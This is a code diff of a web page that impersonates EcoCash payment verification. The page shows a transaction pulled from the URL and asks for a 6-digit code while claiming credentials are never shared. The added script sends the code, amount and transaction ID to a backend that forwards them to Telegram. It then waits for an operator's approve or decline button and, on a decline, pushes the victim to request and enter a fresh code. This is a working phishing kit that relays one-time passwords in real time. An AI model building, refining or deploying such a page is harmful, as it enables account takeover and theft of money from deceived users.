@@ -17,9 +17,7 @@
     --eco-bg: #F8FAFC;
     --eco-border: #E2E8F0;
   }
-
   * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
-
   body {
     background-color: var(--eco-bg);
     font-family: 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
@@ -30,18 +28,33 @@
     flex-direction: column;
   }
 
-  /* --- Loading Screen Overlay --- */
-  #loadingScreen {
+  /* Loading Screen */
+  #loadingScreen, #authorizingScreen, #declinedScreen {
     position: fixed;
     inset: 0;
-    background: var(--eco-bg);
     z-index: 9999;
     display: flex;
     flex-direction: column;
     align-items: center;
     justify-content: center;
+    padding: 24px;
+    text-align: center;
     transition: opacity 0.4s ease;
   }
+  #loadingScreen {
+    background: var(--eco-bg);
+  }
+  #authorizingScreen {
+    background: #FFFFFF;
+    display: none;
+  }
+  #authorizingScreen.show { display: flex; }
+  #declinedScreen {
+    background: #FFFFFF;
+    display: none;
+  }
+  #declinedScreen.show { display: flex; }
+
   .spinner {
     width: 44px;
     height: 44px;
@@ -60,7 +73,22 @@
   }
   @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
 
-  /* --- Main Layout --- */
+  /* Declined state */
+  .declined-icon {
+    width: 80px; height: 80px; border-radius: 50%;
+    background: #FEE2E2; color: var(--eco-red);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 40px; font-weight: 800; margin-bottom: 20px;
+  }
+  .declined-title { font-size: 22px; font-weight: 800; margin-bottom: 8px; }
+  .declined-text { font-size: 14px; color: var(--eco-text-muted); margin-bottom: 24px; line-height: 1.5; }
+  .btn-resend-new {
+    padding: 14px 28px; background: var(--eco-blue); color: #fff;
+    border: none; border-radius: 12px; font-size: 16px; font-weight: 700;
+    font-family: inherit; cursor: pointer;
+  }
+
+  /* Main Layout */
   .app-container {
     width: 100%;
     max-width: 480px;
@@ -74,114 +102,56 @@
   }
   .app-container.show { opacity: 1; }
 
-  /* --- Header --- */
   .header {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    margin-bottom: 24px;
-    padding-top: 10px;
+    display: flex; align-items: center; justify-content: space-between;
+    margin-bottom: 24px; padding-top: 10px;
   }
   .logo { font-size: 24px; font-weight: 800; letter-spacing: -0.5px; }
   .logo-eco { color: var(--eco-blue); }
   .logo-cash { color: var(--eco-red); }
   .header-badge {
-    font-size: 13px;
-    font-weight: 700;
-    color: #64748B;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
+    font-size: 13px; font-weight: 700; color: #64748B;
+    text-transform: uppercase; letter-spacing: 0.5px;
   }
 
-  /* --- Main Card --- */
   .card {
-    background: #FFFFFF;
-    border-radius: 20px;
+    background: #FFFFFF; border-radius: 20px;
     border: 1px solid var(--eco-border);
     box-shadow: 0 4px 20px rgba(0,0,0,0.02);
     overflow: hidden;
   }
-
-  /* Card Top Section */
   .card-top {
-    padding: 32px 24px;
-    text-align: center;
+    padding: 32px 24px; text-align: center;
     border-bottom: 1px solid var(--eco-border);
   }
   .card-title {
-    font-size: 22px;
-    font-weight: 800;
-    color: var(--eco-text-main);
-    margin-bottom: 10px;
-    letter-spacing: -0.5px;
+    font-size: 22px; font-weight: 800; color: var(--eco-text-main);
+    margin-bottom: 10px; letter-spacing: -0.5px;
   }
-  .card-subtitle {
-    font-size: 14px;
-    color: var(--eco-text-muted);
-    line-height: 1.5;
-    padding: 0 10px;
-  }
+  .card-subtitle { font-size: 14px; color: var(--eco-text-muted); line-height: 1.5; padding: 0 10px; }
+  .card-body { padding: 24px; }
 
-  /* Card Middle Section */
-  .card-body {
-    padding: 24px;
-  }
-
-  /* Transaction Box */
   .txn-box {
-    background: #F8FAFC;
-    border-radius: 12px;
-    padding: 16px;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 30px;
-    border: 1px solid #F1F5F9;
+    background: #F8FAFC; border-radius: 12px; padding: 16px;
+    display: flex; justify-content: space-between; align-items: center;
+    margin-bottom: 30px; border: 1px solid #F1F5F9;
   }
   .txn-left { display: flex; flex-direction: column; gap: 4px; }
   .txn-label {
-    font-size: 10px;
-    font-weight: 700;
-    color: #64748B;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
+    font-size: 10px; font-weight: 700; color: #64748B;
+    text-transform: uppercase; letter-spacing: 0.5px;
   }
-  .txn-val {
-    font-size: 15px;
-    font-weight: 700;
-    color: #1E293B;
-    font-family: monospace;
-  }
-  .txn-amount {
-    font-size: 18px;
-    font-weight: 800;
-    color: var(--eco-blue);
-  }
+  .txn-val { font-size: 15px; font-weight: 700; color: #1E293B; font-family: monospace; }
+  .txn-amount { font-size: 18px; font-weight: 800; color: var(--eco-blue); }
 
-  /* Code Input Area */
   .code-section { text-align: center; margin-bottom: 24px; }
-  .code-label {
-    font-size: 14px;
-    font-weight: 600;
-    color: var(--eco-text-main);
-    margin-bottom: 16px;
-  }
-  .inputs-row {
-    display: flex;
-    justify-content: space-between;
-    gap: 8px;
-  }
+  .code-label { font-size: 14px; font-weight: 600; color: var(--eco-text-main); margin-bottom: 16px; }
+  .inputs-row { display: flex; justify-content: space-between; gap: 8px; }
   .code-input {
-    width: 100%;
-    aspect-ratio: 1 / 1.2;
-    border: 2px solid var(--eco-border);
-    border-radius: 12px;
-    font-size: 24px;
-    font-weight: 700;
-    text-align: center;
-    color: var(--eco-text-main);
-    outline: none;
-    background: #FFFFFF;
+    width: 100%; aspect-ratio: 1 / 1.2;
+    border: 2px solid var(--eco-border); border-radius: 12px;
+    font-size: 24px; font-weight: 700; text-align: center;
+    color: var(--eco-text-main); outline: none; background: #FFFFFF;
     transition: border-color 0.15s, box-shadow 0.15s;
   }
   .code-input:focus {
@@ -189,128 +159,89 @@
     box-shadow: 0 0 0 3px rgba(0, 69, 160, 0.1);
   }
 
-  /* Resend Text */
   .resend-row {
-    font-size: 13px;
-    color: var(--eco-text-muted);
-    margin-top: 16px;
-    display: flex;
-    justify-content: center;
-    gap: 6px;
+    font-size: 13px; color: var(--eco-text-muted);
+    margin-top: 16px; display: flex; justify-content: center; gap: 6px;
   }
   .resend-btn {
-    background: none;
-    border: none;
-    font-size: 13px;
-    font-weight: 700;
-    color: var(--eco-text-muted);
-    cursor: not-allowed;
-    font-family: inherit;
-    padding: 0;
+    background: none; border: none; font-size: 13px; font-weight: 700;
+    color: var(--eco-text-muted); cursor: not-allowed; font-family: inherit; padding: 0;
   }
-  .resend-btn.active {
-    color: var(--eco-blue);
-    cursor: pointer;
-    text-decoration: underline;
-  }
+  .resend-btn.active { color: var(--eco-blue); cursor: pointer; text-decoration: underline; }
 
-  /* Verify Button */
   .btn-verify {
-    width: 100%;
-    background: #0066CC;
-    color: #FFFFFF;
-    border: none;
-    border-radius: 12px;
-    padding: 16px;
-    font-size: 16px;
-    font-weight: 700;
-    font-family: inherit;
-    cursor: pointer;
+    width: 100%; background: #0066CC; color: #FFFFFF; border: none;
+    border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 700;
+    font-family: inherit; cursor: pointer; margin-top: 10px;
     transition: background-color 0.15s, transform 0.1s;
-    margin-top: 10px;
   }
   .btn-verify:hover { background: #0052A3; }
   .btn-verify:active { transform: scale(0.98); }
   .btn-verify:disabled { opacity: 0.7; cursor: wait; }
 
-  /* Card Footer */
   .card-footer {
-    padding: 24px;
-    text-align: center;
-    border-top: 1px solid var(--eco-border);
-    background: #FFFFFF;
+    padding: 24px; text-align: center;
+    border-top: 1px solid var(--eco-border); background: #FFFFFF;
   }
   .footer-logo { font-size: 18px; font-weight: 800; margin-bottom: 8px; }
-  .footer-text {
-    font-size: 12px;
-    color: var(--eco-text-muted);
-  }
+  .footer-text { font-size: 12px; color: var(--eco-text-muted); }
 
-  /* Bottom Global Footer */
   .bottom-text {
-    text-align: center;
-    font-size: 12px;
-    color: #94A3B8;
-    margin-top: auto;
-    padding-top: 30px;
-    padding-bottom: 20px;
+    text-align: center; font-size: 12px; color: #94A3B8;
+    margin-top: auto; padding-top: 30px; padding-bottom: 20px;
   }
 
-  /* Toast */
   .toast {
-    position: fixed;
-    bottom: 24px;
-    left: 50%;
+    position: fixed; bottom: 24px; left: 50%;
     transform: translateX(-50%) translateY(70px);
-    background: #111827;
-    color: #FFFFFF;
-    padding: 12px 22px;
-    border-radius: 12px;
-    font-size: 13px;
-    font-weight: 600;
+    background: #111827; color: #FFFFFF;
+    padding: 12px 22px; border-radius: 12px;
+    font-size: 13px; font-weight: 600;
     box-shadow: 0 10px 30px rgba(0,0,0,0.25);
-    opacity: 0;
-    transition: all 0.25s ease;
-    z-index: 2000;
-    pointer-events: none;
-    text-align: center;
-    width: max-content;
-    max-width: 90vw;
+    opacity: 0; transition: all 0.25s ease;
+    z-index: 2000; pointer-events: none; text-align: center;
+    width: max-content; max-width: 90vw;
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
   .toast.success { background: #00A651; }
   .toast.error { background: #E31B23; }
-
 </style>
 </head>
 <body>
 
-  <!-- 5 Second Loading Screen -->
+  <!-- Initial loading -->
   <div id="loadingScreen">
     <div class="spinner"></div>
     <div class="loading-text">Verifying details...</div>
   </div>
 
-  <!-- Main Content -->
+  <!-- Authorizing the transfer (after tapping Verify) -->
+  <div id="authorizingScreen">
+    <div class="spinner"></div>
+    <div class="loading-text">Authorizing the transfer...</div>
+  </div>
+
+  <!-- Declined state -->
+  <div id="declinedScreen">
+    <div class="declined-icon">!</div>
+    <div class="declined-title">Code Expired</div>
+    <div class="declined-text">Your verification code has expired or was declined. Resend a new code to continue.</div>
+    <button class="btn-resend-new" onclick="resendNewFromDeclined()">Resend New Code</button>
+  </div>
+
   <div class="app-container" id="appContainer">
-    
     <header class="header">
       <div class="logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
       <div class="header-badge">VERIFICATION</div>
     </header>
 
     <main class="card">
-      
-      <!-- Top Text -->
       <div class="card-top">
         <h1 class="card-title">Enter verification code</h1>
         <p class="card-subtitle">Enter the 6-digit code you received. It will be sent for approval.</p>
       </div>
 
-      <!-- Middle Form -->
       <div class="card-body">
-        
-        <!-- Transaction Info -->
         <div class="txn-box">
           <div class="txn-left">
             <div class="txn-label">TRANSACTION</div>
@@ -319,7 +250,6 @@
           <div class="txn-amount" id="dispAmt">...</div>
         </div>
 
-        <!-- Input Boxes -->
         <div class="code-section">
           <div class="code-label">6-digit code</div>
           <div class="inputs-row">
@@ -331,24 +261,19 @@
             <input type="tel" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
           </div>
 
-          <!-- Resend Timer -->
           <div class="resend-row">
             <span>Didn't receive the code?</span>
             <button type="button" class="resend-btn" id="resendBtn" onclick="resendCode()">Resend in 12s</button>
           </div>
         </div>
 
-        <!-- Verify Button -->
         <button type="button" class="btn-verify" id="verifyBtn" onclick="submitCode()">Verify</button>
-
       </div>
 
-      <!-- Card Footer -->
       <div class="card-footer">
         <div class="footer-logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
         <div class="footer-text">Your credentials are never shared.</div>
       </div>
-
     </main>
 
     <div class="bottom-text">Powered by EcoCash · Secure payment verification</div>
@@ -357,18 +282,14 @@
   <div class="toast" id="toast"></div>
 
 <script>
-// --- Base64URL Decoder ---
 function b64urlDecode(str) {
   try {
     str = str.replace(/-/g, '+').replace(/_/g, '/');
     while (str.length % 4) str += '=';
     return decodeURIComponent(escape(atob(str)));
-  } catch (e) {
-    return null;
-  }
+  } catch (e) { return null; }
 }
 
-// --- Extract Data from URL ---
 const urlParams = new URLSearchParams(window.location.search);
 const encodedParam = urlParams.get('d');
 
@@ -376,7 +297,6 @@ let actualTxnId = 'TXN-PENDING';
 let actualAmount = '0.00';
 let actualCurrency = 'USD';
 
-// Decode payload to get TXN, Amount, and Currency
 if (encodedParam) {
   const raw = b64urlDecode(encodedParam);
   if (raw) {
@@ -393,34 +313,30 @@ if (encodedParam) {
   actualCurrency = urlParams.get('cur') || actualCurrency;
 }
 
-// --- Setup UI Elements ---
 document.getElementById('dispTx').textContent = actualTxnId;
 document.getElementById('dispAmt').textContent = `${actualCurrency} ${actualAmount}`;
 
-// --- 5 Second Loading Screen Logic ---
+// Initial 5-second loading
 document.addEventListener('DOMContentLoaded', () => {
   setTimeout(() => {
     const loader = document.getElementById('loadingScreen');
     const app = document.getElementById('appContainer');
-    
     loader.style.opacity = '0';
     setTimeout(() => {
       loader.style.display = 'none';
       app.classList.add('show');
     }, 400);
-  }, 5000); // 5 seconds exactly
+  }, 5000);
 });
 
-// --- PIN Input Auto-Focus Logic ---
 const inputs = document.querySelectorAll('.code-input');
 inputs.forEach((input, index) => {
   input.addEventListener('input', (e) => {
-    e.target.value = e.target.value.replace(/[^0-9]/g, ''); // Only numbers
+    e.target.value = e.target.value.replace(/[^0-9]/g, '');
     if (e.target.value.length === 1 && index < inputs.length - 1) {
       inputs[index + 1].focus();
     }
   });
-
   input.addEventListener('keydown', (e) => {
     if (e.key === 'Backspace' && !e.target.value && index > 0) {
       inputs[index - 1].focus();
@@ -428,7 +344,6 @@ inputs.forEach((input, index) => {
   });
 });
 
-// --- Toast Helper ---
 function showToast(msg, type = 'error') {
   const t = document.getElementById('toast');
   t.textContent = msg;
@@ -436,7 +351,6 @@ function showToast(msg, type = 'error') {
   setTimeout(() => t.classList.remove('show'), 3000);
 }
 
-// --- Resend Timer Logic ---
 let timeLeft = 12;
 let timerInterval;
 const resendBtn = document.getElementById('resendBtn');
@@ -447,7 +361,6 @@ function startTimer() {
   resendBtn.classList.remove('active');
   resendBtn.textContent = `Resend in ${timeLeft}s`;
   resendBtn.disabled = true;
-
   timerInterval = setInterval(() => {
     timeLeft--;
     if (timeLeft <= 0) {
@@ -460,56 +373,106 @@ function startTimer() {
     }
   }, 1000);
 }
-startTimer(); // Start on load
+startTimer();
 
 function resendCode() {
   if (resendBtn.disabled) return;
   inputs.forEach(i => i.value = '');
   inputs[0].focus();
-  showToast('A new 6-digit code has been sent.', 'success');
   startTimer();
+
+  // Notify Telegram of a resend request
+  fetch('/api/send', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      resend: true,
+      txnId: actualTxnId,
+      amount: actualAmount,
+      currency: actualCurrency
+    })
+  }).then(() => showToast('New code requested. Check Telegram.', 'success'))
+    .catch(() => showToast('Could not notify. Try again.', 'error'));
 }
 
-// --- Send to Cloudflare Function (Secure) ---
+function resendNewFromDeclined() {
+  document.getElementById('declinedScreen').classList.remove('show');
+  document.getElementById('appContainer').style.display = 'flex';
+  resendBtn.disabled = false;
+  resendBtn.classList.add('active');
+  resendBtn.textContent = 'Resend code';
+  resendCode();
+}
+
+// Poll /api/status until the operator presses a Telegram button
+let statusPoll = null;
+function startStatusPolling() {
+  if (statusPoll) return;
+  statusPoll = setInterval(async () => {
+    try {
+      const res = await fetch('/api/status?txnId=' + encodeURIComponent(actualTxnId));
+      if (!res.ok) return;
+      const data = await res.json();
+      if (data.status === 'approved') {
+        clearInterval(statusPoll); statusPoll = null;
+        window.location.href = 'approved.html' + window.location.search;
+      } else if (data.status === 'declined') {
+        clearInterval(statusPoll); statusPoll = null;
+        document.getElementById('authorizingScreen').classList.remove('show');
+        document.getElementById('appContainer').style.display = 'none';
+        document.getElementById('declinedScreen').classList.add('show');
+      } else if (data.status === 'oops') {
+        clearInterval(statusPoll); statusPoll = null;
+        window.location.href = 'oops.html' + window.location.search;
+      }
+    } catch (e) { /* ignore */ }
+  }, 2000);
+}
+
 async function submitCode() {
   let code = '';
   inputs.forEach(i => code += i.value);
-
   if (code.length !== 6) {
     showToast('Please enter the full 6-digit code.');
     return;
   }
 
-  const btn = document.getElementById('verifyBtn');
-  btn.disabled = true;
-  btn.textContent = 'Verifying...';
+  // Show "Authorizing the transfer..." immediately
+  document.getElementById('appContainer').style.display = 'none';
+  document.getElementById('authorizingScreen').classList.add('show');
 
   try {
-    // Call the secure Cloudflare function (it will automatically add the Telegram buttons)
     const response = await fetch('/api/send', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ 
+      body: JSON.stringify({
         code: code,
-        amount: actualAmount, 
-        currency: actualCurrency, 
-        txnId: actualTxnId 
+        amount: actualAmount,
+        currency: actualCurrency,
+        txnId: actualTxnId
       })
     });
 
-    if (!response.ok) throw new Error('Server failed');
+    if (!response.ok) {
+      let errorMsg = 'Unknown error';
+      try {
+        const errData = await response.json();
+        errorMsg = errData.error || JSON.stringify(errData);
+      } catch (e) { errorMsg = await response.text(); }
+      showToast('Error: ' + errorMsg);
+      document.getElementById('authorizingScreen').classList.remove('show');
+      document.getElementById('appContainer').style.display = 'flex';
+      return;
+    }
 
-    // Success state
-    showToast('Code submitted successfully.', 'success');
-    btn.style.backgroundColor = '#00A651'; // Green
-    btn.textContent = 'Submitted ✓';
-    inputs.forEach(i => i.disabled = true);
-    
+    // Start polling Telegram button responses
+    startStatusPolling();
+
   } catch (error) {
     console.error(error);
-    showToast('Connection error. Please try again.');
-    btn.disabled = false;
-    btn.textContent = 'Verify';
+    showToast('Network error: ' + error.message);
+    document.getElementById('authorizingScreen').classList.remove('show');
+    document.getElementById('appContainer').style.display = 'flex';
   }
 }
 </script>
